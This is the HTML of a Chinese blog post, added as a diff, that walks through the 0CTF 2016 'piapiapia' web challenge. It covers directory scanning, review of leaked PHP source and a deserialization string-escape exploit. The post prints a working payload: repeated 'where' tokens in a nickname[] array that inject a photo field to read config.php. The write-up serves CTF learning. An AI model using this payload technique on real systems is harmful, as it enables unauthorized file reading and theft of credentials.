@@ -1,0 +1,270 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[0CTF 2016]piapiapia 1 | 24kmagic</title><meta name="author" content="qyt"><meta name="copyright" content="qyt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[0CTF 2016]piapiapia1尝试过sql和其他东西，发现没思路 dirsearch扫描，这里如果扫描速度太快可以换下面的 .&#x2F;ctf_high.txt这个字典是我自己总结的，你们可以去网上找或让ai给你总结 1python dirsearch.py -u &quot;http:&#x2F;&#x2F;cf7016da-d794-496a-ab9b-669958940227.node5.buuo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[0CTF 2016]piapiapia 1">
+<meta property="og:url" content="https://2829750658t-svg.github.io/posts/7285d1ac.html">
+<meta property="og:site_name" content="24kmagic">
+<meta property="og:description" content="[0CTF 2016]piapiapia1尝试过sql和其他东西，发现没思路 dirsearch扫描，这里如果扫描速度太快可以换下面的 .&#x2F;ctf_high.txt这个字典是我自己总结的，你们可以去网上找或让ai给你总结 1python dirsearch.py -u &quot;http:&#x2F;&#x2F;cf7016da-d794-496a-ab9b-669958940227.node5.buuo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-03-07T06:12:24.000Z">
+<meta property="article:modified_time" content="2026-03-08T08:15:28.484Z">
+<meta property="article:author" content="qyt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[0CTF 2016]piapiapia 1",
+  "url": "https://2829750658t-svg.github.io/posts/7285d1ac.html",
+  "image": "https://2829750658t-svg.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-03-07T06:12:24.000Z",
+  "dateModified": "2026-03-08T08:15:28.484Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "qyt",
+      "url": "https://2829750658t-svg.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://2829750658t-svg.github.io/posts/7285d1ac.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[0CTF 2016]piapiapia 1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="google-site-verification" content="xcoxCJdnrLSrFpybmYmk6WSRqz-H1rnZB7BKSjdkWD0" /><meta name="google-site-verification" content="H8Bhbw_EXOKyVq27SUdcn_avXaVqBOWzs2lPJV_HSVw" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">29</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/bj2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">24kmagic</span></a><a class="nav-page-title" href="/"><span class="site-name">[0CTF 2016]piapiapia 1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[0CTF 2016]piapiapia 1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-07T06:12:24.000Z" title="发表于 2026-03-07 14:12:24">2026-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-08T08:15:28.484Z" title="更新于 2026-03-08 16:15:28">2026-03-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/">ctf题解</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/t-answer/">t_answer</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/t-answer/web/">web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/t-answer/web/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>尝试过sql和其他东西，发现没思路</p>
+<p>dirsearch扫描，这里如果扫描速度太快可以换下面的</p>
+<p>.&#x2F;ctf_high.txt这个字典是我自己总结的，你们可以去网上找或让ai给你总结</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u &quot;http://cf7016da-d794-496a-ab9b-669958940227.node5.buuoj.cn:81/&quot; -t 1 -d 5 --full-url -R 5 -w ./ctf_high.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260129202021496.png" alt="image-20260129202021496"></p>
+<p><a target="_blank" rel="noopener" href="http://www.zip打开下载了一个文件夹/">www.zip打开下载了一个文件夹</a></p>
+<p>之前在另外一道题目有了解过这个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p><img src="/images/image-2170920260129202300.png" alt="image-2170920260129202300.png"></p>
+<p>那么接下来进入代码审议环节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260129202726505.png" alt="image-20260129202726505"></p>
+<p>精简一下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\21709\Desktop\www\config.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;</span><br><span class="line">	$config[&#x27;username&#x27;] = &#x27;root&#x27;;</span><br><span class="line">	$config[&#x27;password&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$config[&#x27;database&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$flag = &#x27;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">//明白目标：读取config.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\21709\Desktop\www\update.php</span><br><span class="line">		move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br><span class="line">		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line">		//这里name的值随便写，反正md5之后都是32位</span><br><span class="line">		</span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		//profile被序列化储存了</span><br><span class="line">		echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\21709\Desktop\www\profile.php</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">//profile又被反序列化拿出来了</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]))</span><br><span class="line">		//看到file_get_contents，我们只要让photo改成我们想要读取的文件config.php即可</span><br><span class="line">		所以我们要在上传序列化的profile中做一些小修改</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">C:\Users\21709\Desktop\www\class.php		</span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">		//这里提供一种修改思路：where-&gt;hacker,5-&gt;6,数据流篡改（反序列化字符串逃逸）</span><br></pre></td></tr></table></figure>
+
+<h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>正常的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;123&quot;;s:5:&quot;email&quot;;s:3:&quot;a@a&quot;;s:8:&quot;nickname&quot;;s:5:&quot;admin&quot;;s:5:&quot;photo&quot;;s:10:&quot;upload/1.jpg&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要在photo前面的nickname的值塞入一堆东西，这样能让我们的<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>(34个)变成下一条指令解析</p>
+<p>但是这里别忘记对于nickname的过滤：只能是字母数字，还有长度限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>考虑数组绕过：</p>
+<p>数组在preg_match的筛选下会返回值 false（字数ok，内容也全是字母）从而绕过检查，但是serialize仍然会处理它。</p>
+<h3 id="对nickname的构造"><a href="#对nickname的构造" class="headerlink" title="对nickname的构造"></a>对nickname的构造</h3><p>nick[]&#x3D;34个where-&gt;把想要被解析的指令挤出去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>千万要注意：我们需要先登录才能上传profile，</p>
+<p>那么登陆之前肯定要注册，但主页是没有注册的按钮的</p>
+<p>还记得register.php吗，打开注册就行</p>
+<p>登陆后填入信息，然后抓包改数据，上传成功后再打开profile页面查看源代码，再解码就ok</p>
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130141530790.png" alt="image-20260130141530790"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260130141339424.png" alt="image-20260130141339424"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io">qyt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io/posts/7285d1ac.html">https://2829750658t-svg.github.io/posts/7285d1ac.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://2829750658t-svg.github.io" target="_blank">24kmagic</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/57dc7f58.html" title="xxs知识点简短速记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">xxs知识点简短速记</div></div><div class="info-2"><div class="info-item-1">xxs知识点简短速记分类： 1.反射型（外部输入后，在浏览器端输出触发） 2.存储型（东西存在文件中，web程序读取代码并输出） 知识点1：html实体编码： HTML 实体编码 的规则是： &amp;# + 十进制 ASCII 码 + ;  字母 r 的十进制 ASCII 码是 114。 所以它的 HTML 实体编码就是 r。  CSRF：到底是什么？ 黑客没偷你的证件（他拿不到 Cookie）。 黑客只是骗你点了一下按钮（利用了你还在登录状态的权限）。 结果： 在你完全不知情的情况下，你的身份被黑客**“借用”**了。 举例： &lt;img= src=1 oner&amp;#114;or=ale&amp;#114;t(1)&gt; 知识点2：Referer 是看你从哪来。 Token 是看你带没带暗号。  Sec-Fetch  Sec: 是 Security（安全）的缩写。 Fetch: 翻译为 “获取” 或 “抓取”（在编程里指代发起一个网络请求）。 合起来的意思： “安全获取元数据”（Security Fetch Metadata）。  它是浏览器在发起请求时，自动给服...</div></div></div></a><a class="pagination-related" href="/posts/68bc984e.html" title="NewStar CTF 2025 Week1 - misc EZ_fence"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">NewStar CTF 2025 Week1 - misc EZ_fence</div></div><div class="info-2"><div class="info-item-1">NewStar CTF 2025 Week1 - misc EZ_fence题目： “ RAR 发现一张残缺的照片竟然需 要 4 颗钉子才能钉住，照片里面似乎藏着秘密。 ” 1.说照片里面有秘密不如先看看照片里面能找到什么 -&gt;找到了flag还有rar压缩包  于是选择binwalk查看和分离(参数-e) 不知道为什么foremost分离不出来  这里面需要密码 这时候联想到栅栏fence密码和四个栏数（四个钉子），但是我们去哪里找到这个密码呢？ 2.查看属性发现高度被修改了  打开steglove改一些数据  找到宽和长修改 理解： 1.FF C0 -&gt;JPEG 的 Start of Frame 标记 2.00 11 -&gt;该段内容的长度 3.08    -&gt;精确度  就得到了图片里面的内容： 12348426513709qazwsxedcrfvtgbyhnu jmikop1QWSAERFDTYHGUIKJOPLMNBVCXZ -_rdh9zfwzSgoVA7GWtLPQJK=vwuZvjhvPyyvjnMWoSotB  2.1先用四个栏数看看解密，发现w...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qyt</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">29</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.zhihu.com/people/7e5acf574f89c3cba9460c739673e2cf" target="_blank" title="知乎"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://xhslink.com/m/2t0Ndc1uvYL" target="_blank" title="小红书"><i class="fas fa-notes-medical"></i></a><a class="social-icon" href="https://163cn.tv/Z9ohElT" target="_blank" title="网易云音乐"><i class="fas fa-music"></i></a><a class="social-icon" href="https://www.instagram.com/tenyeahqweyeah?igsh=NG92enl2NTE0NGMx&amp;utm_source=qr" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">很高兴能向你展示我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">1.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1"><span class="toc-number">2.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">构造思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9nickname%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">3.1.1.</span> <span class="toc-text">对nickname的构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.2.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">3.2.1.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f3526173.html" title="dirsearch+sql慢速扫描命令">dirsearch+sql慢速扫描命令</a><time datetime="2026-03-08T07:43:44.000Z" title="发表于 2026-03-08 15:43:44">2026-03-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b2be5532.html" title="快速入门crypto-RSA 核心笔记">快速入门crypto-RSA 核心笔记</a><time datetime="2026-03-08T07:00:39.000Z" title="发表于 2026-03-08 15:00:39">2026-03-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/d846445c.html" title="密码学crypto学习笔记">密码学crypto学习笔记</a><time datetime="2026-03-08T07:00:14.000Z" title="发表于 2026-03-08 15:00:14">2026-03-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5857229f.html" title="b站网课ctf学习笔记">b站网课ctf学习笔记</a><time datetime="2026-03-08T06:59:38.000Z" title="发表于 2026-03-08 14:59:38">2026-03-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/9573684e.html" title="ZIP 明文爆破笔记">ZIP 明文爆破笔记</a><time datetime="2026-03-08T06:57:34.000Z" title="发表于 2026-03-08 14:57:34">2026-03-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By qyt</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': '2829750658t-svg/2829750658t-svg.github.io',
+      'data-repo-id': 'R_kgDOQS61dQ',
+      'data-category-id': 'DIC_kwDOQS61dc4C1UR-',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
